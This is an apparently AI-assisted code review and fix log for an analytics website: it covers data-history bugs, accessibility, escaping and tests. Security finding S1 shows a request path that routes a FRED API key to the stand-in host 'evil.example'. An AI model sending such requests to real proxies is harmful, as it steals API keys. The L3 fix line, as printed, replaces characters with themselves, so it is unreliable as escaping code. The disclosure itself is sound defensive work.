# Codebase review & fixes — 2026-06-16

Comprehensive read-only audit of the whole `baileyanalytics` codebase + a light
security glance at the legacy `EconomicDashboard` prototype, followed by an
aggressive fix pass on a branch (`codebase-review-fixes`). This file is the
single record; each finding is tagged **✅ FIXED**, **DEFERRED**, or
**NOT A FINDING** in place.

## Method

- Established a green baseline (full `unittest` suite).
- Fanned out 8 parallel read-only opus finder agents partitioned by subsystem ×
  dimension: (1) lens core pipeline, (2) source fetchers, (3) predictions,
  (4) distribution/publication & escaping, (5) frontend JS, (6) HTML/CSS & sync
  drift, (7) CI/CD & repo security + EconomicDashboard glance, (8) test suite.
- Each finding was then **verified by the orchestrator** against the actual code
  (refuting the provably-impossible, deduping) before it counted here.

## Baseline

- **719 tests.** Initially reported "green" but that was a masked pipeline exit
  code; a clean run surfaced exactly **1 real failure** — the CWD-dependent
  `test_predict_roster` test (finding **M2**). After fixing M2 the suite is
  719/719 from any working directory.

## Disposition summary

| ID | Sev | Finding | Disposition |
|----|-----|---------|-------------|
| H1 | High | CoinGecko `None` BTC-dominance baked permanently into `_crypto_history.json` | ✅ FIXED |
| H2 | High | `lens.css` missing nav keyboard focus ring (present on home/About) — ~45 baked pages | ✅ FIXED |
| H3 | High | `lens.css` footer links color-only (axe link-in-text-block) — ~45 baked pages | ✅ FIXED |
| M1 | Med | Stale open prediction resurfaces after a grade-then-predict failure in the same run | ✅ FIXED |
| M2 | Med | CWD-dependent test fails when suite not run from repo root | ✅ FIXED |
| S1 | Med (SECURITY) | EconomicDashboard FRED proxy can leak API key to an arbitrary host | DEFERRED (separate non-shipping repo) |
| L1 | Low | Dead `narrative.rule_coverage` / `rule_level_trend` (+ their tests) | ✅ FIXED |
| L2 | Low | `refresh_economic` missing-key early-return aborts later categories in a full local run | ✅ FIXED |
| L3 | Low | JSON-LD headline in `briefpage._jsonld` not `</script>`-safe | ✅ FIXED |
| L4 | Low | `brief.js` injects `transitions[].href` into an attribute without `esc()` | ✅ FIXED |
| L5 | Low | Brief archive listing uses undefined class `.hub-back` (unstyled back link) | ✅ FIXED |
| L6 | Low | `staticread` escaping test asserts "escaped" but feeds no special chars | ✅ FIXED |
| L7 | Low | `derive.units_to_millions` has no direct test | ✅ FIXED |
| L8 | Low | CoinGecko retry only handles 429 (not transient 5xx) | ✅ FIXED |
| L9 | Low | `scripts/predict.py` CLI entry point has no test | ✅ FIXED |
| L10 | Low | Home nav-selector scoping diverges from the other two chrome blocks | DEFERRED (no user impact; future-drift only) |
| L11 | Low | `404.html` nav is a 3-item set (omits Track Record/About) | DEFERRED (likely intentional — your call) |
| L12 | Low | No `concurrency:` guard on the three write-to-`main` workflows | DEFERRED (live-CI change; mitigated by push-retry) |
| L13 | Low | Digest send step runs under `success() || failure()` | DEFERRED (live-CI change; script-side guards hold) |
| L14 | Low | `compute_rotation` re-bases to a sliding window start | DEFERRED (documented design tradeoff) |
| L15 | Low | One-off `scripts/tools/*.py` migrations are untested | DEFERRED (acceptable as-is) |

---

## High

### H1 — CoinGecko `None` BTC-dominance is baked permanently into crypto history ✅ FIXED
- **Location:** `scripts/lenses/coingecko.py:78-82` (`global_metrics`) → `scripts/lenses/coingecko.py:130-132` (`crypto_market_structure`) → `scripts/refresh_lenses.py:225` (`_build_crypto`).
- **Problem:** `global_metrics` returns `{"btc_dominance": None}` whenever the `/global` call succeeds (HTTP 200) but the payload lacks `market_cap_percentage.btc` (a degraded/rate-limited response or schema drift). `crypto_market_structure` wraps that `None` in a **successful** return, so the caller's try/except never fires, and `_build_crypto` does `merge_series(hist["dominance"], [{"date": today, "value": None}])`. Because the key is `today`'s date, no future run ever overwrites it → the `null` persists forever in `_crypto_history.json`, the exact data `merge_series` exists to preserve past CoinGecko's 365-day window. BTC dominance is also the hub-readable key stat, so a `null` shows as a chart gap + "—".
- **Fix:** In `_build_crypto`, only merge the dominance point when its value is not `None` (rotation still updates; prior dominance history is preserved untouched). Routes a missing reading to the existing additive-fallback behavior instead of corrupting history.
- **Test:** `test_refresh_markets.py` — `_build_crypto` with a mocked `crypto_market_structure` returning `dominance_point.value=None` must leave prior dominance intact (no `null` written) while still merging rotation.

### H2 — `lens.css` missing nav keyboard focus ring ✅ FIXED
- **Location:** `dashboards/lens.css:13` vs `index.html:100-104` and `about.html:77-81`.
- **Problem:** Both hand-written pages give top-nav links a 2px focus outline on keyboard focus; `lens.css` only recolors the bottom border. Every page that loads `lens.css` (the hub, 8 category hubs, brief + archive, track-record, all 33 lens pages) inherits the weaker treatment — a WCAG 2.4.7 weak spot on ~45 pages. This is the classic shared-chrome sync-drift trap (an a11y fix was applied to the inline blocks but not the shared stylesheet).
- **Fix:** Add `nav a:focus-visible{outline:2px solid var(--blue);outline-offset:4px;border-radius:2px}` to `lens.css` (matching the inline blocks).
- **Verification:** CSS — no unit-test harness in this stack; verified by inspection against the two inline sources.

### H3 — `lens.css` footer links are color-only ✅ FIXED
- **Location:** `dashboards/lens.css:57` vs `index.html:280-282`.
- **Problem:** Home's footer source links carry a resting underline to pass axe's link-in-text-block contrast rule (explicit comment in `index.html`). The identical footer renders via `lens.css .foot` on ~45 pages where the links stay color-only — the same a11y issue home already fixed.
- **Fix:** Port the resting-underline treatment (`text-decoration:underline; text-decoration-thickness:1px; text-underline-offset:2px; text-decoration-color:var(--border)`) and the hover into `lens.css .foot a`.
- **Verification:** CSS — verified by inspection against `index.html`.

---

## Medium

### M1 — Stale open prediction resurfaces after a grade-then-predict failure ✅ FIXED
- **Location:** `scripts/predictions/runner.py:216-219` (and the same risk after `_check_revisions` at :210).
- **Problem:** In `run_daily`, once a prior open prediction is graded, `prior` is set to `None` and a fresh prediction is built via `_make_open_entry`. If `_make_open_entry` (or `_check_revisions`) raises in that same iteration — realistic, e.g. `models.predict_one` raising `ModelError` on a fit failure — the `except` re-appends `open_by_key[entry.key]`, i.e. the **original** entry whose target was just graded and frozen in the ledger. Result: `open.json` carries an "open" prediction whose id already exists as a graded ledger row, violating "one open per indicator / never predict a print that already exists." The track record itself stays correct (grade is frozen + idempotent), so this is Medium, not Critical; it self-heals on the next successful run.
- **Fix:** Track `graded_this_run`; in the `except`, only resurrect the prior open entry when grading did **not** already consume it. A key that grades-then-fails simply emits no open entry that run (next run re-creates a fresh one).
- **Test:** `test_predict_runner.py` — open → advance fixture so the target prints → make `_make_open_entry` raise for that key → assert no `open.json` id collides with a graded ledger id.

### M2 — CWD-dependent test fails outside the repo root ✅ FIXED
- **Location:** `scripts/tests/test_predict_roster.py:117`.
- **Problem:** The only test in the suite that resolves a data path relative to the **current working directory** (`os.path.join("data", …)`). Run from anywhere but `baileyanalytics/` (e.g. the `scripts/` dir, or a CI step that doesn't `cd`), the path misses and the assertion fails on an otherwise-green main. This was the lone baseline failure.
- **Fix:** Anchor to the repo root via `pathlib.Path(__file__).resolve().parents[2] / "data"`, like the sibling data checks.
- **Test:** the test itself; now passes from any CWD.

---

## Security (surfaced prominently)

### S1 — EconomicDashboard FRED proxy can leak the API key to an arbitrary host — DEFERRED
- **Severity:** Medium. **SECURITY.**
- **Location:** `EconomicDashboard/server.py:28-30` (proxy URL built by raw string concat) and `:51` (`HTTPServer(("", PORT), …)` binds all interfaces).
- **Problem:** `url = FRED_BASE + query + sep + "api_key=" + FRED_API_KEY` where `query = self.path[len("/proxy/fred"):]` is attacker-controlled. A request to `/proxy/fred@evil.example/x` resolves to `https://api.stlouisfed.org/fred@evil.example/...?api_key=<KEY>` — `api.stlouisfed.org/fred` becomes *userinfo* and `evil.example` the real host, exfiltrating the live FRED key. The host is never validated; the server also binds `""` (all interfaces), so anyone on the same LAN can reach it.
- **Why DEFERRED:** `EconomicDashboard/` is a **separate, non-shipping legacy prototype** in its own git repo; the task scope is "light security glance only, otherwise out of scope," and these fixes belong on that repo's own branch, not the `baileyanalytics` review branch. FRED keys are free + rate-limited + trivially rotatable, lowering impact. **No secret is committed** (key lives only in a gitignored `.env`).
- **Recommended fix (ready to apply on request):** bind to `127.0.0.1`; validate `urllib.parse.urlparse(url).netloc == "api.stlouisfed.org"` before fetching; reject `@`/`//`/`\` in `query`.

---

## Low — fixed

### L1 — Dead `narrative.rule_coverage` / `rule_level_trend` ✅ FIXED
- **Location:** `scripts/lenses/narrative.py:273, 363`.
- **Problem:** Neither is wired to any `Indicator`/`BankingIndicator` in `config.py` or referenced by any module/JS/HTML/workflow (grepped the whole repo; only their own tests + historical design docs reference them). Removed-feature remnants; `rule_level_trend` duplicates `energy_level`/`level_points` logic. Risk is maintenance drift (someone "fixes" thresholds that change nothing live).
- **Fix:** Delete both functions and their tests (`test_narrative_banking.py` `TestCoverage` + the level-trend tests).

### L2 — `refresh_economic` missing-key early-return aborts later categories ✅ FIXED
- **Location:** `scripts/refresh_lenses.py` (`refresh_economic` hard `return 1` on missing key) + `main` (`if code: return code`).
- **Problem:** On a no-flag full local run with `FRED_API_KEY` unset, economic returns 1 and `main` returns immediately — so `--banking` (needs no key), `--brief`, and every other category never run. Other `refresh_*` record a non-fatal code and continue; only economic-first aborts the whole run. (Production is unaffected — each workflow scopes one category per step.)
- **Fix:** Treat the missing-key economic case like the others (record the code, continue) so banking/brief still run.
- **Test:** `test_refresh_economic`-style — a full run with no `FRED_API_KEY` returns non-zero but still reaches later categories.

### L3 — JSON-LD headline not `</script>`-safe ✅ FIXED
- **Location:** `scripts/lenses/briefpage.py:168-179` (`_jsonld`).
- **Problem:** The JSON-LD block is `json.dumps(...)` injected raw inside `<script type="application/ld+json">`. `json.dumps` does not escape `<` / `</script>`. Every *visible* string is `html.escape`d, but this one is not. Latent only (verdict sentences are 100% human-authored copy-bank today) — becomes real the moment the copy bank gains a `<`.
- **Fix:** After `json.dumps`, replace `<`→`<`, `>`→`>`, `&`→`&` before embedding (standard JSON-in-HTML hardening).
- **Test:** `test_briefpage.py` — a verdict sentence containing `</script>`/`<` must not appear raw in the JSON-LD block.

### L4 — `brief.js` href injected without `esc()` ✅ FIXED
- **Location:** `dashboards/brief.js:34-36` (`compactStrip`).
- **Problem:** `t0.href` (from `today.json`) is interpolated raw into an `href` attribute while every text field beside it is `esc()`-wrapped. Latent (href is baked by `brief.lens_href` from a fixed list today). `track-record.js` already `esc()`-wraps its baked hrefs — this is the lone unescaped one.
- **Fix:** `href="${esc(t0.href)}"`.
- **Verification:** JS — no harness; verified by inspection (matches `track-record.js` convention).

### L5 — Brief archive listing uses undefined class `.hub-back` ✅ FIXED
- **Location:** `scripts/lenses/briefpage.py` (archive index render) → `dashboards/brief/index.html`.
- **Problem:** Emits `class="hub-back"`, which has no CSS rule anywhere; the back link on the archive *listing* renders unstyled (the dated archive pages correctly use `.archive-banner`). Generator bug — fix `briefpage.py`, not the baked HTML.
- **Fix:** Use the existing `.back` class.
- **Test:** `test_briefpage.py` — the archive index uses `class="back"`, not `hub-back`.

### L6 — `staticread` escaping test not actually exercised ✅ FIXED
- **Location:** `scripts/tests/test_staticread.py:40-43`.
- **Problem:** The test name claims escaping but the fixture contains no `<`/`&`/`>`, so the five `html.escape` calls in `render_fragment` are never validated — a dropped `escape()` would still pass. This fragment is baked into all 33 lens pages.
- **Fix:** Add an indicator/headline with `&`/`<` and assert `&amp;`/`&lt;` appear (and the raw form does not).

### L7 — `derive.units_to_millions` untested ✅ FIXED
- **Location:** `scripts/lenses/derive.py:95-103`; `test_derive.py`.
- **Problem:** CLAUDE.md explicitly warns these derive helpers are easy to mix up; `units_to_millions` (4170000→"4.17") was the only one with no direct assertion.
- **Fix:** Add a `TestUnitsToMillions` mirroring `TestToMillions` (incl. null skip + 2-dp).

### L8 — CoinGecko retry only handles 429 ✅ FIXED
- **Location:** `scripts/lenses/coingecko.py:36-45` (`_get`).
- **Problem:** The retry loop only retries HTTP 429; a transient 500/502/503/504 raises on first occurrence (the run then falls back to prior data, but a retry would usually have succeeded). Capped at 4 attempts — no infinite-loop risk.
- **Fix:** Also retry on `exc.code in (500, 502, 503, 504)` using the same bounded backoff. (Left `URLError` to propagate fast — avoids long hangs on hard network failures.)
- **Test:** `test_coingecko.py` — a 503-then-200 sequence retries and succeeds; a persistent 500 still raises (so the caller's fallback fires).

### L9 — `scripts/predict.py` CLI untested ✅ FIXED
- **Location:** `scripts/predict.py`.
- **Problem:** The argparse wiring, the dry-run roster filter, and the `tournament` exit-code contract (`0 if n else 1`) had no test; a broken arg/exit code would only surface in a live workflow run.
- **Fix:** Add `test_predict_cli.py` invoking `predict.main([...,"--dry-run"])` against a redirected pred dir, asserting the return codes.

---

## Deferred (with recommended fix)

- **L10 — Home nav-selector scoping divergence.** `index.html` scopes nav rules as `nav.top-nav a` (home has no wordmark) while `about.html`/`lens.css` use `nav a`, and home omits the `aria-current` rule. No user impact today (home is correctly not a destination); future-drift risk only. *Fix:* align home's nav selectors/rule set for parallel maintenance.
- **L11 — `404.html` 3-item nav.** Omits Track Record/About, adds Home. Appears to be a deliberate minimal recovery page (`noindex`, standalone CSS). *Your call:* mirror the standard 4-item nav if desired.
- **L12 — No `concurrency:` on write-to-`main` workflows.** The push-retry loops handle the common non-fast-forward race; residual risk is an unresolvable rebase conflict on a same-workflow self-overlap dropping one run (next cron self-heals). *Fix:* add `concurrency: { group: write-main, cancel-in-progress: false }` shared across the three workflows. Deferred because it changes live-CI cadence and can't be observed from here.
- **L13 — Digest send under `success() || failure()`.** Fires even after upstream failures, but `send_digest.should_send`/`already_sent` guards prevent a bad/duplicate send. *Optional:* gate on `success()` only, or document the script-side guards as load-bearing. Deferred (live-CI change).
- **L14 — `compute_rotation` window-boundary rebase.** Each daily run re-indexes to the current 365-day window's start, so points across the boundary mix index baselines (a small artificial level shift in the "Max" view). Matches the `merge_series` accumulation docstring — a documented tradeoff. *Fix (if precision on Max matters):* anchor the index to a fixed historical date carried in `_crypto_history.json`.
- **L15 — `scripts/tools/*.py` untested.** Documented one-time, idempotent migrations that mutate committed HTML; re-running no-ops safely. Acceptable as-is.
- **S1 — EconomicDashboard proxy** (see Security section).

---

## Not findings (verified correct — do not "fix")

- **`digest._subject` is intentionally unescaped.** It's a plaintext email Subject header (lens titles legitimately contain `&`, e.g. "S&P 500"); escaping would surface literal `&amp;` to readers. JSON transport escaping is handled by `json.dumps` in `send_digest`. Locked by `test_digest`.
- **`fmtVal` unit-prefix regex differs cosmetically across lens.js / predict.js / track-record.js** (`/^[a-z]/i.test(unit)` vs `/[a-z]/i.test(unit[0])`) but is functionally identical for all inputs. Structural no-bundler duplication.
- **`build._fmt` ↔ `lens.js fmtVal`** are in sync; the two theoretical micro-diffs (Python `round` banker's vs JS `Math.round` half-up for `thousands`; Python Unicode `isalpha` vs JS ASCII test) have no triggering input in the current config/data.
- **CoinGecko/Yahoo epoch→date via `gmtime` (UTC)** is the correct, internally-consistent choice; cross-source joins that matter use same-source dates.

## Verified-clean highlights (so future reviews can skip)

- **Escaping on every bake/distribution surface** (feed RSS, sitemap, brief HTML, email HTML, `#baked-read` lens fragments, home marker regions) routes data-derived strings through `xml.sax.saxutils.escape`/`html.escape`, tested with adversarial `&`/`<`/`</…>` inputs. (The two latent exceptions — JSON-LD L3, brief.js href L4 — are now fixed.)
- **Prediction grading + ledger integrity:** first-observed actual frozen forever; revisions footnote-only; append-idempotent per id; year-rollover; band/skill-margin math; daily→weekly Friday resample; SARIMA `s≤12` cap — all correct and well-tested (the one gap, M1, is fixed).
- **The test-isolation rule** is honored: no def-time `=REPO_ROOT`/`=BRIEF_OUT_DIR`/`=FEED_PATH` defaults on any write path; brief/publish tests redirect all three to temp dirs; no test writes under the real repo (after M2).
- **Additive & fault-tolerant pipeline:** every non-FRED inject + every fetcher is individually guarded; a failed/empty source keeps prior data and never blanks other lenses or crashes the run.
- **No committed secrets** anywhere in `baileyanalytics`; `.env` gitignored in both repos; keys only from env; not logged (urllib exceptions don't include the URL); minimal `permissions: contents: write`; actions pinned to major versions; push-retry implemented; `pip install -r requirements.txt` in all three workflows.
- **Frontend JS** escapes all fetched strings via `esc()`; recession-band index math, the duplicate-tick `afterUpdate` dedup, range selector, journey-aware back link, and graceful degradation on missing JSON are all correct; `hub.js lensHref` ↔ `brief.py lens_href` slug rules match.
